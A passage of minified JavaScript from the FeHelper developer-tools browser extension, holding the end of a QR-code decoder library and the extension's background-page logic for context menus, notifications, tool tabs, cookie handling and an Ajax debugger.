qrcode.width=t.width,qrcode.height=t.height,qrcode.imagedata=n.getImageData(0,0,qrcode.width,qrcode.height),qrcode.result=qrcode.process(n),null!=qrcode.callback&&qrcode.callback(qrcode.result),qrcode.result}var r=new Image;r.onload=function(){var e=document.createElement("canvas"),t=e.getContext("2d"),n=r.height,i=r.width;if(r.width*r.height>qrcode.maxImgSize){var o=r.width/r.height;i=o*(n=Math.sqrt(qrcode.maxImgSize/o))}e.width=i,e.height=n,t.drawImage(r,0,0,e.width,e.height),qrcode.width=e.width,qrcode.height=e.height;try{qrcode.imagedata=t.getImageData(0,0,e.width,e.height)}catch(e){return qrcode.result="Cross domain image reading not supported in your browser! Save it to your computer then drag and drop the file!",void(null!=qrcode.callback&&qrcode.callback(qrcode.result))}try{qrcode.result=qrcode.process(t)}catch(e){qrcode.result="error decoding QR Code"}null!=qrcode.callback&&qrcode.callback(qrcode.result)},r.src=e},qrcode.isUrl=function(e){return/(ftp|http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/.test(e)},qrcode.decode_url=function(e){var t="";try{t=escape(e)}catch(n){t=e}var n="";try{n=decodeURIComponent(t)}catch(e){n=t}return n},qrcode.decode_utf8=function(e){return qrcode.isUrl(e)?qrcode.decode_url(e):e},qrcode.process=function(e){var t=(new Date).getTime(),n=qrcode.grayScaleToBitmap(qrcode.grayscale());if(qrcode.debug){for(var r=0;r<qrcode.height;r++)for(var i=0;i<qrcode.width;i++){var a=4*i+r*qrcode.width*4;qrcode.imagedata.data[a]=(n[i+r*qrcode.width],0),qrcode.imagedata.data[a+1]=(n[i+r*qrcode.width],0),qrcode.imagedata.data[a+2]=n[i+r*qrcode.width]?255:0}e.putImageData(qrcode.imagedata,0,0)}var s=new o(n).detect();qrcode.debug&&e.putImageData(qrcode.imagedata,0,0);for(var h=Decoder.decode(s.bits).DataByte,c="",d=0;d<h.length;d++)for(var u=0;u<h[d].length;u++)c+=String.fromCharCode(h[d][u]);(new Date).getTime();return qrcode.decode_utf8(c)},qrcode.getPixel=function(e,t){if(qrcode.width<e)throw"point error";if(qrcode.height<t)throw"point error";return point=4*e+t*qrcode.width*4,p=(33*qrcode.imagedata.data[point]+34*qrcode.imagedata.data[point+1]+33*qrcode.imagedata.data[point+2])/100,p},qrcode.binarize=function(e){for(var t=new Array(qrcode.width*qrcode.height),n=0;n<qrcode.height;n++)for(var r=0;r<qrcode.width;r++){var i=qrcode.getPixel(r,n);t[r+n*qrcode.width]=e>=i}return t},qrcode.getMiddleBrightnessPerArea=function(e){for(var t=Math.floor(qrcode.width/4),n=Math.floor(qrcode.height/4),r=new Array(4),i=0;4>i;i++){r[i]=new Array(4);for(var o=0;4>o;o++)r[i][o]=new Array(0,0)}for(var a=0;4>a;a++)for(var s=0;4>s;s++){r[s][a][0]=255;for(var h=0;n>h;h++)for(var c=0;t>c;c++){var d=e[t*s+c+(n*a+h)*qrcode.width];d<r[s][a][0]&&(r[s][a][0]=d),d>r[s][a][1]&&(r[s][a][1]=d)}}for(var u=new Array(4),f=0;4>f;f++)u[f]=new Array(4);for(a=0;4>a;a++)for(s=0;4>s;s++)u[s][a]=Math.floor((r[s][a][0]+r[s][a][1])/2);return u},qrcode.grayScaleToBitmap=function(e){for(var t=qrcode.getMiddleBrightnessPerArea(e),n=t.length,r=Math.floor(qrcode.width/n),i=Math.floor(qrcode.height/n),o=new Array(qrcode.height*qrcode.width),a=0;n>a;a++)for(var s=0;n>s;s++)for(var h=0;i>h;h++)for(var c=0;r>c;c++)o[r*s+c+(i*a+h)*qrcode.width]=e[r*s+c+(i*a+h)*qrcode.width]<t[s][a];return o},qrcode.grayscale=function(){for(var e=new Array(qrcode.width*qrcode.height),t=0;t<qrcode.height;t++)for(var n=0;n<qrcode.width;n++){var r=qrcode.getPixel(n,t);e[n+t*qrcode.width]=r}return e},Array.prototype.remove=function(e,t){var n=this.slice((t||e)+1||this.length);return this.length=0>e?this.length+e:e,this.push.apply(this,n)};var M=3,S=57,O=8,y=2;return qrcode.orderBestPatterns=function(e){function t(e,t){return xDiff=e.X-t.X,yDiff=e.Y-t.Y,Math.sqrt(xDiff*xDiff+yDiff*yDiff)}var n,r,i,o=t(e[0],e[1]),a=t(e[1],e[2]),s=t(e[0],e[2]);if(a>=o&&a>=s?(r=e[0],n=e[1],i=e[2]):s>=a&&s>=o?(r=e[1],n=e[0],i=e[2]):(r=e[2],n=e[0],i=e[1]),function(e,t,n){var r=t.x,i=t.y;return(n.x-r)*(e.y-i)-(n.y-i)*(e.x-r)}(n,r,i)<0){var h=n;n=i,i=h}e[0]=n,e[1]=r,e[2]=i},e.exports=qrcode,e.exports}({exports:{}});var BgPageInstance=function(){let e=TRstaticjsmsg_type,t=TRoptionssettings,n=TRbackgroundnetwork,r=TRpagecapturecaptureapi(e),i={codeStandardMgr:{},ajaxDebuggerMgr:{},csDetectIntervals:[],manifest:chrome.runtime.getManifest(),notifyTimeoutId:-1},o=!1,a=function(e,t){chrome.tabs.query({active:!0,currentWindow:!0},function(n){let r=n[0].id;i.codeStandardMgr[r][e]=!0,i.codeStandardMgr[r].css&&i.codeStandardMgr[r].js&&(i.codeStandardMgr[r].allDone=!0),i.codeStandardMgr[r].allDone&&"function"==typeof t&&t()})},s=function(t){i.codeStandardMgr[t.id]=i.codeStandardMgr[t.id]||{},i.codeStandardMgr[t.id].allDone?(clearInterval(i.csDetectIntervals[t.id]),chrome.tabs.sendMessage(t.id,{type:e.CODE_STANDARDS,event:e.FCP_HELPER_DETECT})):void 0===i.csDetectIntervals[t.id]&&(chrome.tabs.sendMessage(t.id,{type:e.CODE_STANDARDS,event:e.FCP_HELPER_INIT}),h({message:"正在准备数据，请稍等..."}),i.csDetectIntervals[t.id]=setInterval(function(){s(t)},200))},h=function(e){let t="fehleper-notify-id";if(clearTimeout(i.notifyTimeoutId),e.closeImmediately)return chrome.notifications.clear(t);e.icon||(e.icon="static/img/fe-48.png"),e.title||(e.title="温馨提示"),chrome.notifications.create(t,{type:"basic",title:e.title,iconUrl:chrome.runtime.getURL(e.icon),message:e.message}),i.notifyTimeoutId=setTimeout(()=>{chrome.notifications.clear(t)},parseInt(e.autoClose||3e3,10))},c=function(t,n){return function(r){n&&setTimeout(function(){chrome.tabs.sendMessage(r.id,{type:e.TAB_CREATED_OR_UPDATED,content:n,event:t})},300)}},d=function(e,n,r){chrome.tabs.query({windowId:chrome.windows.WINDOW_ID_CURRENT},function(e){t.getOptsFromBgPage(t=>{let i,o=!1;if(t.FORBID_OPEN_IN_NEW_TAB){let t=new RegExp("^chrome.*/"+n+"/index.html$","i");for(let n=0,r=e.length;n<r;n++)if(t.test(e[n].url)){o=!0,i=e[n].id;break}}o?chrome.tabs.update(i,{highlighted:!0},c(n,r)):chrome.tabs.create({url:n+"/index.html",active:!0},c(n,r))})})},u=function(e){chrome.tabs.query({active:!0,currentWindow:!0},function(t){let n=t[0];i.ajaxDebuggerMgr[n.id]=!i.ajaxDebuggerMgr[n.id],chrome.tabs.executeScript(n.id,{code:'console.info("FeHelper提醒：Ajax Debugger开关已'+(i.ajaxDebuggerMgr[n.id]?"开启":"关闭")+'！");',allFrames:!1}),e&&e()})},f=function(e,t){chrome.tabs.query({active:!0,currentWindow:!0},function(n){let r=n[0];if(e&&e(i.ajaxDebuggerMgr[r.id]),t){let e="";e=i.ajaxDebuggerMgr[r.id]?o?"DevTools已打开，确保已切换到【Console】界面，并关注信息输出，愉快的进行Ajax Debugger！":"请打开DevTools，并切换到【Console】界面，关注信息输出，愉快的进行Ajax Debugger！":"已停止当前页面的Ajax Debugger功能！",alert(e)}})},l=function(n){let o=t.getMenuOpts();n.forEach(t=>{if("MENU_PAGE_ENCODING"===t)PageEncoding.createMenu(i.contextMenuId,o.MENU_PAGE_ENCODING);else{let n={MENU_QRCODE_CREATE:function(t,n){chrome.tabs.executeScript(n.id,{code:"("+function(e){let t=e.linkUrl,n=e.pageUrl,r=e.srcUrl,i=e.selectionText;return t||r||i||n}.toString()+")("+JSON.stringify(t)+")",allFrames:!1},function(t){d(0,e.QR_CODE,"object"==typeof t?t[0]:t)})},MENU_QRCODE_DECODE:function(e,t){g(e,t)},MENU_PAGE_CAPTURE:function(e,t){r.full(t)},MENU_COLOR_PICKER:function(e,t){E()},MENU_STR_ENDECODE:function(t,n){chrome.tabs.executeScript(n.id,{code:"("+function(e){return e.selectionText}.toString()+")("+JSON.stringify(t)+")",allFrames:!1},function(t){d(0,e.EN_DECODE,"object"==typeof t?t[0]:t)})},MENU_JSON_FORMAT:function(t,n){chrome.tabs.executeScript(n.id,{code:"("+function(e){return e.selectionText}.toString()+")("+JSON.stringify(t)+")",allFrames:!1},function(t){d(0,e.JSON_FORMAT,"object"==typeof t?t[0]:t)})},MENU_CODE_FORMAT:function(t,n){chrome.tabs.executeScript(n.id,{code:"("+function(e){return e.selectionText}.toString()+")("+JSON.stringify(t)+")",allFrames:!1},function(t){d(0,e.CODE_BEAUTIFY,"object"==typeof t?t[0]:t)})},MENU_AJAX_DEBUGGER:function(e,t){u(()=>{f(null,!0)})},MENU_CODE_STANDARD:function(e,t){s(t)},MENU_IMAGE_BASE64:function(t,n){d(0,e.IMAGE_BASE64,t.srcUrl)},MENU_JSON_COMPARE:function(t,n){d(0,e.JSON_COMPARE)},MENU_CODE_COMPRESS:function(t,n){d(0,e.CODE_COMPRESS)},MENU_PAGE_OPTIMI:function(t,n){d(0,e.SHOW_PAGE_LOAD_TIME)},MENU_TIME_STAMP:function(t,n){d(0,e.TIME_STAMP)},MENU_RANDOM_PASS:function(t,n){d(0,e.RANDOM_PASSWORD)},MENU_JS_REGEXP:function(t,n){d(0,e.REGEXP_TOOL)},MENU_MARKDOWN_TL:function(t,n){d(0,e.HTML_TO_MARKDOWN)},MENU_STICKY_NOTE:function(t,n){d(0,e.STICKY_NOTES)}};chrome.contextMenus.create({title:o[t].icon+"  "+o[t].text,contexts:o[t].contexts||["all"],parentId:i.contextMenuId,onclick:n[t]})}})},w=function(){i.contextMenuId&&(chrome.contextMenus.remove(i.contextMenuId),i.contextMenuId=null)},_=function(){t.getOptsFromBgPage(e=>{e.opt_item_contextMenus?(w(),i.contextMenuId=chrome.contextMenus.create({title:"FeHelper工具",contexts:["page","selection","editable","link","image"],documentUrlPatterns:["http://*/*","https://*/*","file://*/*"]}),t.didMenuSettingSaved()?t.getOptsFromBgPage(e=>{l(Object.keys(e).filter(e=>/^MENU_/.test(e)))}):l(t.getDefaultContextMenus())):w()})},g=function(t,n){let r=TRstaticvendorzxingzxingminjs;r.callback=function(i){if(-1!==(i||"").indexOf("error decoding QR Code")){let i=new Image;i.src=t.srcUrl,i.onload=function(){let t=this.naturalWidth,o=this.naturalHeight;!function(t,i,o,a,s){let h=document.createElement("canvas");h.setAttribute("id","qr-canvas"),h.height=s+100,h.width=a+100;let c=h.getContext("2d");c.fillStyle="rgb(255,255,255)",c.fillRect(0,0,h.width,h.height),c.drawImage(t,o,i,a,s,50,50,a,s),r.callback=function(t){chrome.tabs.sendMessage(n.id,{type:e.QR_DECODE,result:t})},r.decode(h.toDataURL())}(i,0,0,t,o)}}else chrome.tabs.sendMessage(n.id,{type:e.QR_DECODE,result:i})},r.decode(t.srcUrl)},E=function(){chrome.tabs.query({active:!0,currentWindow:!0},function(t){let n=t[0].id;chrome.tabs.sendMessage(n,{type:e.SHOW_COLOR_PICKER,enableColorPicker:!0},function(t){chrome.tabs.sendMessage(n,{type:e.SHOW_COLOR_PICKER,doPick:!0},function(e){})})})},m=function(){chrome.runtime.onMessage.addListener(function(r,i,o){var s;return r.type===e.GET_OPTIONS?t.getOptsFromBgPage(o):r.type===e.SET_OPTIONS?(t.setOptsFromBgPage(r.items),_(),h({message:"配置已生效，请继续使用!",autoClose:2e3})):r.type===e.MENU_SAVED?t.didMenuSettingSaved(o):r.type===e.JSON_PAGE_FORMAT_REQUEST?t.getOptsFromBgPage(t=>{t.JSON_PAGE_FORMAT&&chrome.tabs.query({active:!0,currentWindow:!0},function(n){chrome.tabs.sendMessage(n[0].id,{type:e.JSON_PAGE_FORMAT,options:{MAX_JSON_KEYS_NUMBER:t.MAX_JSON_KEYS_NUMBER,AUTO_TEXT_DECODE:"true"===t.AUTO_TEXT_DECODE}})})}):r.type===e.JS_CSS_PAGE_BEAUTIFY_REQUEST?chrome.tabs.query({active:!0,currentWindow:!0},function(n){let r=n[0];chrome.tabs.executeScript(r.id,{code:"("+(()=>{let e={js:"javascript",css:"css"}[location.pathname.substring(location.pathname.lastIndexOf(".")+1).toLowerCase()],t=document.contentType.toLowerCase();return e?"text/html"===t&&(e=void 0):/\/javascript$/.test(t)?e="javascript":/\/css$/.test(t)&&(e="css"),e}).toString()+")()"},function(n){"javascript"!==n[0]&&"css"!==n[0]||t.getOptsFromBgPage(t=>{t.JS_CSS_PAGE_BEAUTIFY&&chrome.tabs.sendMessage(r.id,{type:e.JS_CSS_PAGE_BEAUTIFY,content:n[0]})})})}):r.type===e.CALC_PAGE_LOAD_TIME?(s=r.wpo,chrome.tabs.query({active:!0,currentWindow:!0},function(e){s?chrome.tabs.create({url:"wpo/index.html?"+btoa(encodeURIComponent(JSON.stringify(s))),active:!0}):h({message:"对不起，检测失败"})})):r.type===e.COLOR_PICKER?function(t){chrome.tabs.query({active:!0,currentWindow:!0},function(n){let r=n[0].id;chrome.tabs.captureVisibleTab(null,{format:"png"},function(n){chrome.tabs.sendMessage(r,{type:e.SHOW_COLOR_PICKER,setPickerImage:!0,pickerImage:n},function(e){t&&t()})})})}(o):r.type===e.AJAX_DEBUGGER_SWITCH?f(o):r.type===e.AJAX_DEBUGGER_CONSOLE?function(e){chrome.tabs.query({active:!0,currentWindow:!0},function(t){let n=t[0];chrome.tabs.executeScript(n.id,{code:"("+function(e){let t=JSON.parse(unescape(e));console[t[0]].apply(console,Array.prototype.slice.call(t,1))}.toString()+")('"+e.content+"');"})})}(r):r.type===e.OPEN_OPTIONS_PAGE?chrome.runtime.openOptionsPage():r.type===e.GET_CSS?n.readFileContent(r.link,o):r.type===e.GET_JS?n.readFileContent(r.link,o):r.type===e.GET_HTML?n.readFileContent(r.link,o):r.type===e.GET_COOKIE?n.getCookies(r,o):r.type===e.REMOVE_COOKIE?n.removeCookie(r,o):r.type===e.SET_COOKIE?n.setCookie(r,o):r.type===e.CSS_READY?a("css",o):r.type===e.JS_READY?a("js",o):r.type===e.HTML_READY&&a("html",o),!0});let r=0;chrome.runtime.onConnect.addListener(function(t){t.name===e.DEV_TOOLS&&(0===r&&(o=!0),r++,t.onDisconnect.addListener(function(e){0===--r&&(o=!1)}))}),chrome.runtime.onInstalled.addListener(({reason:e,previousVersion:t})=>{switch(e){case"install":chrome.runtime.openOptionsPage();break;case"update":setTimeout(()=>{chrome.browserAction.setBadgeText({text:"+++1"}),setTimeout(()=>{chrome.browserAction.setBadgeText({text:""})},1500)},1500)}}),chrome.runtime.setUninstallURL(i.manifest.homepage_url)};return{init:function(){setTimeout(()=>{chrome.runtime.requestUpdateCheck(e=>{"update_available"===e&&chrome.runtime.reload()})},1e4),m(),_()},runHelper:function(t,n){chrome.tabs.query({active:!0,currentWindow:!0},function(i){let o=i[0];if(1===t.useFile){let n=t.msgType===e.QR_CODE?o.url:"";d(0,t.msgType,n)}else switch(t.msgType){case e.FCP_HELPER_DETECT:s(o);break;case e.PAGE_CAPTURE:r.full(o);break;case e.SHOW_PAGE_LOAD_TIME:chrome.tabs.query({active:!0,currentWindow:!0},function(t){let n=t[0];chrome.tabs.sendMessage(n.id,{type:e.GET_PAGE_WPO_INFO})});break;case e.AJAX_DEBUGGER:u(n)}})},notify:h,showColorPicker:E,tellMeAjaxDbgSwitch:f,getCapturedData:r.getCapturedData}}();BgPageInstance.init();